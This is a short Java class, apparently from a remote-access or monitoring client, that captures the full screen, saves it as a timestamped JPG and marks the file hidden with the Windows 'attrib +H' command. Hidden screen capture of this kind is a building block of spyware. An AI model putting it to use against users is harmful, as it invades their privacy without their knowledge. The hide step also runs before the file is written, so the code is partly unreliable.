package client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.Calendar;

public class PrintScreen
{
        public File printScreen() throws HeadlessException, AWTException, IOException
        {
            Calendar calendar =  Calendar.getInstance();
            Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage capture = new Robot().createScreenCapture(screen);

            String timeStamp = calendar.getTime().toString().split(" ")[3];
            String filename = "sc_" + trimColon(timeStamp) +".jpg";

            File image = new File(filename);
            Runtime.getRuntime().exec("attrib +H " + filename);
            ImageIO.write(capture, "jpg", image);

            return image;
        }

        private String trimColon(String toTrim)
        {
            String[] split = toTrim.split(":");
            return split[0] + "-" + split[1]+ "-" +split[2];
        }
}
